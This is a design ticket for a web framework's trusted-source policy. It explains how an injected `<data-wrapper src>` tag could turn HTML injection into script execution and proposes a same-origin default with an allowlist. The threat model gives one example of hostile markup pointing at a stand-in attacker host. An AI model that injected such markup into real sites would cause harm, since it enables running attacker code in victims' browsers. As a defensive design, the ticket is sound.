# Ticket 016: Trusted-source policy for `<data-wrapper src>`

## Status

IN PROGRESS — default posture ratified (Option B, same-origin). Security-info
documentation has landed; runtime source-policy enforcement is still pending.

## Problem

`load()` fetches a view URL and **executes** its `<script type="module"
data-module>` (blob URL + dynamic `import`). That makes `src` a code-execution
sink, not just a data fetch.

The danger is escalation: on a page with a strict CSP, an attacker who achieves
HTML injection normally finds `<script>` and inline handlers inert. But an
injected `<data-wrapper src="//attacker.example/x.html">` (or a same-origin
`src="/uploads/user.html"`) hands the framework a mandate to fetch and run code.
Inert markup injection becomes script execution.

CSP is **not** an available mitigation here: runtime import maps + blob module
composition require a permissive `script-src` (`blob:`, plus any shim CDN). A
`script-src` strict enough to stop the escalation also breaks the framework.
So the framework itself has to enforce a source policy.

Related fixes already landed (this review):
- `$innerhtml`/`$outerhtml` throw; raw HTML needs the named `$unsafeHTML`
  opt-in (`bind`, `PROP_ALIASES`).
- `javascript:`/`vbscript:` values are neutralized in URL attributes
  (`href`/`src`/`action`/`formaction`) in `setProp`.

This ticket covers the third and largest face: which URLs a wrapper may load.

## Design

A "trusted source" allowlist, enforced in `load()` / `loadChildWrapper` before
fetch. Model it on CSP's own trust story.

1. **Snapshot the policy once, at framework init.** Read it before any UGC can
   enter the DOM; a policy injected later must not be able to widen it. This is
   the security-load-bearing detail — without it, an attacker who can inject a
   `<data-wrapper>` can also inject a policy tag. Same rule CSP follows (policy
   must precede content).

2. **Policy source.** A `<meta name="data-wrapper-src-policy" content="...">`
   read at init. Prefer meta over a `data-*` on the framework `<script>` so
   page-level policy is not confused with the script's functional attributes,
   and matches the CSP-meta mental model.

3. **Match granularity** (content is a space/`;`-separated list):
   - `'self'` — same-origin only. The one-token 80% win; kills
     `src="//attacker.example/…"`. Note: does **not** stop same-origin
     user-uploaded HTML.
   - origin entries (`https://cdn.example.com`) — allow specific cross-origin.
   - path-prefix entries (`/views/`) — needed for the same-origin-upload case:
     restrict loads to your own views directory.

4. **Enforcement.** Resolve `new URL(src, baseURI)`, test against the snapshot,
   and on violation **refuse to load + `console.error`** with attribution. A
   blocked src is hostile runtime data, not a dev-authoring mistake, so it does
   not throw the app down (consistent with the `javascript:`-scheme handling). A
   dev typo pointing outside the allowlist surfaces the same clear error.

## Decision (ratified)

**Default posture: Option B — same-origin (secure-by-default).** Cross-origin
`src` requires an explicit policy. Protects the majority with zero config; only
the cross-origin-view minority opts in. The documented CDN *install* loads the
**framework** via `<script src>`, not a cross-origin `<data-wrapper src>`, so
this does not regress the install story. It is a behavior change only for anyone
loading a genuinely cross-origin view.

This default is chosen out of *necessity*: the framework can't rely on a strict
CSP today (see below), so a same-origin default is the strongest posture we can
enforce ourselves without new platform work.

## Future direction: step up a tier (Trusted Types as the metric)

Same-origin-by-default is a framework-enforced allowlist standing in for a
platform control we can't currently use. The north star is to step up a tier so
the browser enforces the boundary directly and our allowlist becomes
defense-in-depth rather than the sole line.

The concrete, testable acceptance metric is **Trusted Types enforcement**
(`Content-Security-Policy: require-trusted-types-for 'script'`), now Baseline
2026. Under enforcement the browser throws a `TypeError` on any raw-string write
to an injection sink unless it passes through a named `TrustedTypePolicy`. That
replaces the vague "strict CSP" goal with a pass/fail conformance test.

data-wrapper does not run under enforcement today. It writes raw strings to four
Trusted-Types-protected sinks:
- `$unsafeHTML` → `Element.innerHTML` (TrustedHTML sink).
- `<iframe $srcdoc>` → `HTMLIFrameElement.srcdoc` (TrustedHTML sink).
- `importComponent` → the injected `<script type="importmap">.textContent`
  (TrustedScript sink).
- `loadShim` → `script.src` (TrustedScriptURL sink).

The step-up work routes each through a single framework `TrustedTypePolicy`, plus
a CSP story for the blob-module composition (real-URL or nonce/hash module
registration so `script-src` need not allow `blob:`). If none of these is a hard
wall — i.e. multi-import-maps are not unsafe by definition — this is worth its
own ticket, and the same-origin default becomes the belt to that CSP's
suspenders. Note this likely changes the authoring format: inline
`data-module` blocks become blob modules today, so an enforced mode would prefer
external module files (`<script type="module" data-module src="./x.js">`).

Strict authoring mode would change the component format. Inline
`<script type="module" data-module>` blocks would no longer be the default
authoring path, because the current runtime turns them into blob modules. A
strict mode would likely require external module files via
`<script type="module" data-module="..." src="./component.js">`, a static or
nonce-aware import-map story, and browser verification across the supported
matrix.

## Non-goals

- Not a CSP replacement; complements it where CSP can't be strict.
- No allowlist for the framework's own module import / import-map composition —
  that is trusted first-party config, not a per-wrapper UGC surface.

## Progress

Done:

- Option B is ratified: without an explicit policy, `<data-wrapper src>` should
  load same-origin views only.
- The technical info page now includes `views/info/security.html`, wired into
  `info.html`.
- The security info page measures the current posture against public standards:
  OWASP DOM-XSS guidance, CWE-79, CSP Level 3, and Trusted Types.
- The page documents the alpha threat model: developer-authored views and trusted
  bound data; UGC and third-party-loaded component views are out of scope until
  the 1.0 roadmap.
- The page documents existing sink protections: `$text`, blocked
  `$innerHTML` / `$outerHTML`, explicit `$unsafeHTML`, URL-scheme
  neutralization for the current URL attrs, and no string-eval event handling.
- The ticket now uses `$unsafeHTML` consistently.

Pending before this ticket is complete:

- Implement the runtime source policy in `src/lib/element.ts` before `fetch()`.
- Snapshot `<meta name="data-wrapper-src-policy" content="...">` at framework
  initialization time, not during each load.
- Enforce default same-origin when no policy is configured.
- Enforce explicit origin and same-origin path-prefix entries when a policy is
  configured.
- Refuse blocked loads with `console.error` attribution and no page-level crash.
- Add contract tests for default same-origin, allowed same-origin, blocked
  cross-origin, blocked out-of-prefix, allowed explicit origin/prefix, and
  policy snapshot immutability.
- Update `views/info/security.html` if the final runtime grammar differs from
  the current ticket text.
- Expand URL-scheme neutralization beyond `href`, `src`, `action`, and
  `formaction` where the attribute is a straightforward single URL. Decide
  separately how to handle list-valued URL attributes such as `srcset` and
  `ping`.
- Run `bun run review` and `bun report`; record the size delta.

Roadmap / not alpha-blocking:

- UGC-safe rendering and sanitization policy.
- Third-party component view loading.
- CSS-injection hardening for hostile content.
- Trusted Types enforcement compatibility
  (`require-trusted-types-for 'script'`) as the 1.0 security metric.
- Strict-CSP-compatible authoring mode, likely with external module files and a
  nonce/static import-map story.

## Acceptance

- [ ] Policy snapshotted at init; a policy tag injected after load cannot widen it
  (contract test: inject a `<meta>` post-init, assert it has no effect).
- [ ] With Option B default (or an explicit policy), a cross-origin / out-of-prefix
  `src` is refused and logged; an allowed `src` loads normally.
- [ ] `bun review` green; size stays within the ticket 015 budget (report the delta).
- [x] A `views/info/security.html` section (dogfooded) documents the policy, the
  `$unsafeHTML` opt-in, and the URL-scheme neutralization.
